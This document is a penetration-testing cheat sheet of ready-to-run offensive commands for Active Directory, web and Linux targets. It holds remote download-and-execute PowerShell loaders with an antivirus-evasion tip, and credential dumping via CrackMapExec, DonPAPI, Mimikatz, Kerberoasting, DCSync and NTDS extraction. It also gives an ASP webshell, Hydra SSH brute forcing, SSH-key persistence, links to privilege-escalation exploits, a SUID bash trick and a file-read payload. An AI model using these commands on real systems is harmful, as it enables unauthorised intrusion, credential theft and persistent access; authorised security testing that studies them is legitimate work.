# Active Directory

## Mapping

Use BloodHound to find compromission paths. First execute the collector on a host that is in the targeted domain.
```powershell
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1’);Invoke-BloodHound"
```
If it's possible, execute SharpHound. On Linux, you can use the python version. More information here : https://github.com/BloodHoundAD/SharpHound and https://github.com/fox-it/BloodHound.py
```bash
python3 bloodhound.py -u 'XXX' -dc 'DOMAIN' -c all
```
The tool give you a zip file, that you have to send to a Neo4j database. On Linux, install Neo4j and start the service :
```bash
sudo neo4j start
```
Then execute BloodHound and import the zip file.
## Shares
Dump all shares via CrackMapExec. This can be used on native Kali distribution :
```bash
crackmapexec smb IP_ADDRESS/MASK -u 'XXX' -p 'XXX' -M spider_plus -o READ_ONLY=false
```
This command create a directory cme_spider_plus in /tmp (for Linux). To retrive passwords, simply use grep, by using keywords like 'password', 'pass', 'username', 'ldap://', etc ..
```bash
grep -rnw ./ -e 'password'
```
If detected by AV/EDR, try PowerShell one-liner PowerView :
```powershell
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')"
```
Then, a lot of functionalities can be used. To find all domain shares :
```powershell
Find-DomainShare -CheckShareAccess
```
All the functionalities here : https://powersploit.readthedocs.io/en/latest/Recon/
## Dump credentials
### CrackMapExec
Many possibilites. Use --local-auth if using a local admin account.
With lsassy module :
```bash
crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN'-u 'USER' -p 'PASSWORD' -M lsassy
```
Dump SAM (local hashes) :
```bash
crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN'-u 'USER' -p 'PASSWORD' --sam
```
Dump LSA secrets :
```bash
crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN'-u 'USER' -p 'PASSWORD' --lsa
```
### DonPAPI
Use DonPAPI to retrieve a lot of credentials (wifi, dpapi keys, browsers passwords, ...) :
```bash
python3 DonPAPI.py DOMAIN/USERNAME:PASSWORD@IP_ADDRESS
```
It's possible to use the tool with Pass-The-Hash :
```bash
python3 DonPAPI.py DOMAIN/USERNAME@IP_ADDRESS --hashes LM:NT
```
### Mimikatz
On Windows, retrieve password/hash from a dump file :
```powershell
sekurlsa::minidump "XXXXXXXXX.DMP"
sekurlsa::logonPasswords
```
On Kali, use pypykatz based on python :
```bash
pypykatz lsa minidump 'XXX.DMP'
```
### Others
Native Windows command :
```cmd
rundll32 keymgr.dll, KRShowKeyMgr
```
Savoir : Mimikatz recompiled in Go lang : https://github.com/vincd/savoir

## Impersonation
```powershell
$password = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential('FQDN.DOMAIN\user_to_run_as', $password)
Invoke-Command -ComputerName Server01 -Credential $credential -ScriptBlock { COMMAND }
```

## Kerberoast
GetUserSPNs and get hashes :
```bash
impacket-GetUserSPNs -request -dc-ip IP_ADDRESS DOMAIN/USERNAME -outputfile hashes.kerberoast
```
If you get hashes, try to crack it and then use DCSync exploit :
```bash
impacket-secretsdump -just-dc-ntlm DOMAIN/USERNAME:PASSWORD@DC_IP
```

## AS-REP Roasting
Look for users without Kerberos pre-authentication required attribute (using credential) :
```markdown
impacket-GetNPUsers -dc-ip <IP-DC> domain/username:password
```

Get a TGT for a user, whithout his password, if you know that this account have Kerberos pre-auth disabled :
```markdown
impacket-GetNPUsers -dc-ip <IP-DC> domain/username -no-pass
```

## NTDS Exfiltration

Dump NTDS :

```markdown
crackmapexec smb IP -u "USERNAME" -p "PASSWORD" -d "DOMAIN" --ntds
```

Extract hashes from NTDS :

```markdown
cat ntds.dit | cut -d : -f 4 |sort|uniq > hashes.txt
```

## Pentest Web

### Webshell

ASP : 
```markdown
<%
Response.write("<pre>")
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c " & Request.QueryString("cmd"))
o = cmd.StdOut.Readall()
Response.write(o)
Response.write("</pre>")
%>
```



## Bruteforce

### SSH

Use Hydra :
```markdown
hydra -l USERNAME -P FILE_CONTAINING_PASSWORDS -M FILE_CONTAINING_IP_TO_BRUTEFORCE -t 4 ssh
```

## Tips

### SSH

Generate SSH key :
```markdown
ssh-keygen -t rsa
```

Paste it to authorized_keys :
```markdown
echo XXXX >> ~/.ssh/authorized_keys
```

### Port Forwarding

To access a locally exposed service on a remote machine :

```markdown
ssh -L YOUR_PORT:localhost:PORT_EXPOSED user@IP
```

### Get a proper shell
```markdown
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privesc

### Linux
CVE-2021-4034 : Polkit privilege escalation exploit
```markdown
https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py
```

CVE-2021-3156 : Sudo Baron Samedit exploit
```markdown
https://github.com/redhawkeye/sudo-exploit
```
Adding SUID to bash if you can control a binary/script launched by root :
```markdown
chmod +s /bin/bash
/bin/bash -p
```

### Web
Read PHP Code with PHP Filter :
```markdown
https://X.X.X.X/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd
```
